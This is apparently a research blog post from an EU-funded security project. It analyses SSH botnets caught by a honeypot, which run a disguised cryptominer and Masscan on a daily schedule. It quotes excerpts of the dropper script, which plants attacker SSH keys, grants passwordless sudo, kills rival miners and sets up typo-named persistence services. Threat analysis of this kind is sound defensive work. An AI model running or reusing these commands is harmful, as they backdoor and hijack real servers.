---
title: SSH botnets with a 9 to 5
description: SSH botnets with a fixed running schedule
slug: ssh-botnets-9-5
tags: [SOCcare, security, threat intelligence sharing]
hide_table_of_contents: false
---
import SOCcareLogo from './assets/soccare.png';
import IPs from './assets/ssh-botnets-august-2024-ips.png';
import Zoom from './assets/ssh-botnets-august-2024-zoom.png';
import OpenSearch from './assets/ssh-botnets-august-2024-opensearch.PNG';

Every publicly exposed server will be, at some point, attacked by botnets.
In this blog post, we will concentrate on the SSH botnets, i.e., the ones that
try to connect via SSH to vulnerable endpoints (due to weak `user:password` combinations,
SSH daemon misconfigurations and so on). After connecting to an endpoint,
they usually run various commands (e.g., download and execute malware).

As part of the [SOCcare project](./2024-08-12-SOCcare.md) where Politehnica Bucharest
is one of the partners, we deployed a honeypot to detect and study the SSH botnets’ behavior.
During the month of August, we discovered some interesting patterns.

<!-- truncate -->

As it can be seen in the picture below, SSH botnets are caught by our honeypot
at roughly the same hours.

<!-- <TODO img 1> -->
<img src={OpenSearch}/>

When zooming in the picture (see below), it seems that most attacks are registered
between 8 and 10 AM (EEST).

<!-- <TODO img 2> -->
<img src={Zoom} width="600"/>

Upon further inspection, we determined that the attacks are largely the same.
We have identified two culprits:

  1. **Miner disguised as bioset kernel process** – [VirusTotal Scan of the file downloaded by the botnet on the honeypot](https://www.virustotal.com/gui/file/b76bad860854d951373db76bfa33aab01ca66abbb8b5a82e14ebfd8fa2f24a03).
  2. **Masscan** - [GitHub repository](https://github.com/robertdavidgraham/masscan).

While the first one usually starts the attacks at 9 AM EEST (sometimes at 8 AM EEST),
the second one usually runs at 10 AM.
Most of the time it is the same IP that delivers both payloads.
An interesting thing is that some of the miners started by the first script are
later killed by the second attack.

The picture below shows that the most common IPs are the same, with a nearly
identical distribution. Additional checks show that most IPs originate from
the same  datacenter / VPN services in the Netherlands.

<img src={IPs} width="600"/>

### Miner disguised as bioset kernel process

[The payload dropped](https://www.virustotal.com/gui/file/b76bad860854d951373db76bfa33aab01ca66abbb8b5a82e14ebfd8fa2f24a03)
performs classic operations: from unsetting the history (so the commands won’t show),
adding a new user, inserting various SSH keys in `authorized_keys` file and
editing the `sudoers` file to start cryptomining activities.

```bash
useradd -m tty0
cd ~tty0 ; mkdir .ssh ; cd .ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBM4NOmZw9pMeG/jNpQ1qA7cpSfhzy0JvuEgFuoIM3Hartkcdbx1yRKdZ3rdB12Umt7+z5R+Xnl88WOemKJZ35JMK3sqEr1uQ+kA4oq8POfN3QqJ+xZbIdY7Odlc7xquIWhXjPz0d1aKPikQItZ/oVEyewX3Ps1wKLflVSEhKnEIvaXb6Mp5ZYMHe7MNdIoamNgRIDjBi98a3WkXQRCbpjsmulUxdZ+QjmLBbubutqIxdYKkFH5F2sZm1RYcp76mRm26Num+Uoer3ecdoe/CLv9jBfZOyIrL2ICa8bvT5DNhP1CNKYnhMmHDKyjALgxiMjhFisUVW893K6AKt0BUJ/ gbrc@ions5" > authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxLMf8/BPlrG2ayMqkvncQqxeKPmrP0AynGhindZyNtP/CmEpRgPRZ06yOnvDxbzVhxCo1qLW1SDxpSfEOI4b0RQH+4YJZMzE4cvObPEqhqWRZr6iPrqQqwvGl0HIu+hOdn0KfKiC1yWmBZqvc2AUOP/EniRaVdtgTsI7RG/4fEvoxlaeVvy/Lpkvn5rhAIGaKa/AMSBipBZG/GCTFCHd89xtZ7qtl9nmDjI7FBEZIsCWPz9a4UT2yDqkMvVd2LvZgta+scvv/L+duJ7qR3i6c2nK3h17CqNNBJRZ0jPMMCwpaO+vAYMXSDlnjVBqXN7khTHnmtXwow2byGBM/Ib9z imran@imran" >> authorized_keys
chmod 600 authorized_keys
chown tty0 authorized_keys
chcon -R unconfined_u:object_r:user_home_t:s0 authorized_keys
restorecon -v authorized_keys
cd ..
chmod 700 .ssh
chown -R tty0 .ssh
chattr -R +a +i .ssh
...
grep tty0 /etc/sudoers
if [ $? = 0 ]; then
    echo sudo
else
    echo "%tty0   ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
fi
```

However, the script seems to be pretty well crafted. The next code snippets
highlight the most interesting things we have discovered while inspecting the script.

**Insight 1**. The script kills other miners before starting .

```bash
crontab -r
kill -9 `netstat -anp | grep 5.133.65.54 |  awk '{print $7}' | cut -f 1 -d '/'`
kill -9 `netstat -anp | grep 178.128.242.134 |  awk '{print $7}' | cut -f 1 -d '/'`
...
systemctl stop pwnriglhttps.service
systemctl stop pwnrig.service
systemctl disable pwnrig.service
systemctl disable pwnriglhttps.service
systemctl stop kdomp.service
systemctl stop ModeManager.service
systemctl stop cron.service
systemctl disable cron.service
systemctl stop c3pool_miner.service
systemctl disable c3pool_miner.service
```

**Insight 2**. The script is aware of SELinux

```bash
chcon -R unconfined_u:object_r:user_home_t:s0 authorized_keys
restorecon -v authorized_keys
```

**Insight 3**. Uses typos for common services for persistence (`ModemManager` -> `ModeManager`, `rsyslogd` -> `rsyslgd`)

```bash
    cat <<EOF >> /etc/systemd/system/ModeManager.service
[Unit]
Description=Mode Manager
Wants=network.target
After=syslog.target network-online.target
[Service]
Type=forking
ExecStart=/bin/bash -c 'cp -f -r -- /usr/biosetm64 /usr/-bash 2>/dev/null && /usr/-bash -c  >/dev/null 2>&1 && rm -rf -- /usr/-bash 2>/dev/null'
Restart=always
KillMode=process
[Install]
WantedBy=multi-user.target
EOF
```
**Insight 4**. Sets up a service that periodically kills processes connecting to
some IPs (probably other miners). This is the ``rsyslgd` file which is a bash script (see below)

```bash
#!/bin/bash
while true
do
	pkill -f joseph
	killall joseph
	pkill -f osama
	killall osama
	pkill -f xm64
	killall xm64
	killall daemon
	pkill -f obama1
	killall obama1
	pkill -f kswapd0
	killall kswapd0
	pkill -f jehgms
	killall jehgms
	pkill -f tsm
	killall tsm
	pkill -f rig
	killall rig
	pkill -f xmr
	killall xmr
	...
	kill -9 `ps -ef | grep ps | grep -iv grep | grep -iv ef | awk '{print $2}'`
	kill -9 `ps -ef | grep -w "./cron"  | grep -iv grep | awk '{print $2}'`
	kill -9 `ss -p | grep 179.43.154.189 | awk '{print $7}' | cut -f 2 -d ',' | sed -e 's/=/ /g' | awk '{print $2}'`
	kill -9 `ss -p | grep 51.75.68.83 | awk '{print $7}' | cut -f 2 -d ',' | sed -e 's/=/ /g' | awk '{print $2}'`
	kill -9 `ss -p | grep 121.158.190.84 | awk '{print $7}' | cut -f 2 -d ',' | sed -e 's/=/ /g' | awk '{print $2}'`
	...
done
```
### Masscan

While the first botnet starts miners, this one appears to scan the targets.
The relevant VirusTotal files are the following:
  * https://www.virustotal.com/gui/file/2ef26484ec9e70f9ba9273a9a7333af195fb35d410baf19055eacbfa157ef251
  * https://www.virustotal.com/gui/file/9aa8a11a52b21035ef7badb3f709fa9aa7e757788ad6100b4086f1c6a18c8ab2

What seems to be interesting is that the attack uses opensource tools such as
[this one](https://github.com/nullsecuritynet/tools/blob/main/cracker/against/source/against.py).


### SOCcare

The SOCcare project is co-funded by the European Union, alongside our collaborators,
NRD Cyber Security and RevelSI, and supported by the
European Cybersecurity Competence Centre (ECCC) Centre (ECCC) under Grant Agreement No. 101145843.
Views and opinions expressed are however those of the author(s) only and do not necessarily
reflect those of the European Union or the European Cybersecurity Competence Centre.
Neither the European Union nor the European Cybersecurity Competence Centre can be held responsible for them.

<img src={SOCcareLogo} width="600"/>
